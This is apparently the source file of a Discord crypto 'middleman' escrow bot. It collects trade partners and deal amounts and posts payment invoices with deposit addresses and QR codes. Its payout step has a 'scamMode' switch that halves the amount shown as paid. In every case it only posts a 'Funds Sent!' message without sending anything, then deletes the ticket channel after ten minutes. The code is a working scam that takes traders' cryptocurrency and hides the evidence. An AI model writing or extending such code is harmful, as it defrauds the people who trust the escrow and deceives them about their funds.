const {
  EmbedBuilder,
  ActionRowBuilder,
  ButtonBuilder,
  ButtonStyle,
  AttachmentBuilder,
} = require('discord.js');
const { convertUsdToCrypto } = require('../utils/crypto');
const { generateQR } = require('../utils/qrcode');

const COIN_DISPLAY = {
  BTC:           'Bitcoin (BTC)',
  ETH:           'Ethereum (ETH)',
  LTC:           'Litecoin (LTC)',
  SOL:           'Solana (SOL)',
  'USDT [ERC-20]': 'USDT ERC-20',
};

async function handleDealMessage(message, deal, client) {
  const channel = message.channel;

  // Step: receiver typing their wallet address after real payment detected
  if (deal.step === 'await_receiver_address') {
    const receiverId = deal.receiver || deal.initiator;
    if (message.author.id !== receiverId) return;

    const address = message.content.trim();
    if (!address || address.length < 10) return;

    deal.receiverWalletAddress = address;
    deal.step = 'done';

    const displayCoin = deal.detectedCoin || (deal.coin === 'USDT [ERC-20]' ? 'USDT' : deal.coin);
    const isScam = deal.scamMode === true;

    let payoutStr;
    if (isScam) {
      const halfCrypto = deal.detectedHalfCrypto ?? 0;
      const halfUSD = deal.detectedHalfUSD ?? 0;
      payoutStr = halfCrypto > 0
        ? `**${halfCrypto.toFixed(8).replace(/\.?0+$/, '')} ${displayCoin}**${halfUSD > 0 ? ` (~$${halfUSD.toFixed(2)} USD)` : ''}`
        : `**50%** of the received amount`;
    } else {
      const fullCrypto = deal.detectedAmount ?? 0;
      const fullUSD = deal.detectedUSD ?? 0;
      payoutStr = fullCrypto > 0
        ? `**${fullCrypto.toFixed(8).replace(/\.?0+$/, '')} ${displayCoin}**${fullUSD > 0 ? ` (~$${fullUSD.toFixed(2)} USD)` : ''}`
        : `**100%** of the received amount`;
    }

    const sentEmbed = new EmbedBuilder()
      .setColor(0x00c853)
      .setTitle('Funds Sent!')
      .setDescription(
        `Address confirmed: \`${address}\`\n\n` +
        `Sending ${payoutStr} to your wallet now.\n` +
        `You will receive your funds shortly.\n\n` +
        `This ticket will close in 10 minutes.`
      );

    await channel.send({ content: `<@${receiverId}>`, embeds: [sentEmbed] });

    // Close ticket in 10 minutes
    client.activeDeals.delete(channel.id);
    setTimeout(() => channel.delete().catch(() => {}), 10 * 60 * 1000);
    return;
  }

  // Step: waiting for trade partner mention
  if (deal.step === 'await_partner') {
    let partnerId = null;
    let partnerUser = null;

    // Try mention
    if (message.mentions.users.size > 0) {
      partnerUser = message.mentions.users.first();
      if (partnerUser.id === message.author.id || partnerUser.bot) {
        await message.reply({ content: 'You cannot add yourself or a bot as a trade partner.' });
        return;
      }
      partnerId = partnerUser.id;
    } else {
      // Try ID
      const idMatch = message.content.trim().match(/^\d{17,20}$/);
      if (idMatch) {
        try {
          partnerUser = await client.users.fetch(idMatch[0]);
          partnerId = partnerUser.id;
        } catch {
          await message.reply({ content: 'Could not find that user. Please mention them or provide a valid ID.' });
          return;
        }
      }
    }

    if (!partnerId) return;

    deal.partner = partnerId;
    deal.partnerTag = partnerUser.tag || partnerUser.username;

    // Give partner access
    try {
      await channel.permissionOverwrites.edit(partnerId, {
        ViewChannel: true,
        SendMessages: true,
        ReadMessageHistory: true,
      });
    } catch (e) {}

    deal.step = 'await_roles';

    // Echo the mention
    await channel.send({ content: `<@${partnerId}>` });

    const addedEmbed = new EmbedBuilder()
      .setColor(0x00c853)
      .setDescription(`Successfully added <@${partnerId}> to the ticket.`);

    const roleEmbed = new EmbedBuilder()
      .setColor(0x00c853)
      .setTitle('Role Assignment')
      .setDescription(
        'Select one of the following buttons that corresponds to your role in this deal. Once selected, both users must confirm to proceed.\n\n' +
        `**Sender**\n${deal.sender ? `<@${deal.sender}>` : 'None'}\n` +
        `**Receiver**\n${deal.receiver ? `<@${deal.receiver}>` : 'None'}\n\n` +
        'The ticket will be closed in 30 minutes if left unattended'
      );

    const roleRow = new ActionRowBuilder().addComponents(
      new ButtonBuilder().setCustomId('role_sender').setLabel('Sender').setStyle(ButtonStyle.Secondary),
      new ButtonBuilder().setCustomId('role_receiver').setLabel('Receiver').setStyle(ButtonStyle.Secondary),
      new ButtonBuilder().setCustomId('role_reset').setLabel('Reset').setStyle(ButtonStyle.Danger),
    );

    await channel.send({ embeds: [addedEmbed] });
    await channel.send({ embeds: [roleEmbed], components: [roleRow] });
    return;
  }

  // Step: waiting for deal amount
  if (deal.step === 'await_amount' && message.author.id === deal.sender) {
    const amountStr = message.content.trim().replace(/[$,]/g, '');
    const amount = parseFloat(amountStr);
    if (isNaN(amount) || amount <= 0) {
      await message.reply({ content: 'Please enter a valid USD amount (e.g., 50 or 100.50).' });
      return;
    }

    deal.amount = amount;
    deal.step = 'confirm_amount';

    const confirmEmbed = new EmbedBuilder()
      .setColor(0x00c853)
      .setTitle('Amount Confirmation')
      .setDescription('Confirm that the bot will receive the following USD value')
      .addFields({ name: 'Amount', value: `$${amount.toFixed(2)}`, inline: false });

    const confirmRow = new ActionRowBuilder().addComponents(
      new ButtonBuilder().setCustomId('confirm_amount').setLabel('Confirm').setStyle(ButtonStyle.Success),
      new ButtonBuilder().setCustomId('incorrect_amount').setLabel('Incorrect').setStyle(ButtonStyle.Secondary),
    );

    await channel.send({ embeds: [confirmEmbed], components: [confirmRow] });
    return;
  }
}

async function sendPaymentInvoice(channel, deal) {
  const { coin, sender, receiver, amount } = deal;

  const { price, fee, totalUsd, cryptoAmount, address } = await convertUsdToCrypto(amount, coin);

  deal.cryptoAmount = cryptoAmount;
  deal.address = address;
  deal.step = 'awaiting_payment';

  const coinDisplay = COIN_DISPLAY[coin] || coin;
  const coinTicker = coin.split(' ')[0];

  const summaryEmbed = new EmbedBuilder()
    .setColor(0x2b2d31)
    .setTitle('Deal Summary')
    .setDescription(
      'Refer to this deal summary for any reaffirmations.\nNotify staff for any support required.'
    )
    .addFields(
      { name: 'Sender', value: `<@${sender}>`, inline: false },
      { name: 'Receiver', value: `<@${receiver}>`, inline: false },
      { name: 'Deal Value', value: `$${amount.toFixed(2)}`, inline: false },
      { name: 'Coin', value: `${channel.id}\n${coinDisplay}`, inline: false },
    );

  let qrPath = null;
  try {
    qrPath = await generateQR(address);
  } catch (e) {}

  const invoiceEmbed = new EmbedBuilder()
    .setColor(0x2b2d31)
    .setTitle('Payment Invoice')
    .setDescription(
      'Send the funds as part of the deal to the Middleman address specified below.\n**Please copy the amount provided.**'
    )
    .addFields(
      { name: 'Address', value: address, inline: false },
      {
        name: 'Amount',
        value: `${cryptoAmount} ${coinTicker}\n($${totalUsd.toFixed(2)} USD (includes $${fee.toFixed(2)} fee))\n\nExchange Rate: 1 ${coinTicker} = $${price.toFixed(2)} USD`,
        inline: false
      }
    );

  const copyRow = new ActionRowBuilder().addComponents(
    new ButtonBuilder()
      .setCustomId('copy_details')
      .setLabel('Copy Details')
      .setStyle(ButtonStyle.Secondary)
  );

  const msgs = [];
  msgs.push(await channel.send({ content: `<@${sender}>`, embeds: [summaryEmbed] }));

  if (qrPath) {
    const attachment = new AttachmentBuilder(qrPath, { name: 'qr.png' });
    invoiceEmbed.setThumbnail('attachment://qr.png');
    msgs.push(await channel.send({ embeds: [invoiceEmbed], files: [attachment], components: [copyRow] }));
    const fs = require('fs');
    try { fs.unlinkSync(qrPath); } catch (e) {}
  } else {
    msgs.push(await channel.send({ embeds: [invoiceEmbed], components: [copyRow] }));
  }

  deal.invoiceMsg = msgs;

  const awaitEmbed = new EmbedBuilder()
    .setColor(0x2b2d31)
    .setDescription('<a:load:1490592113702735873> Awaiting transaction...');
  await channel.send({ embeds: [awaitEmbed] });
}

module.exports = { handleDealMessage, sendPaymentInvoice };
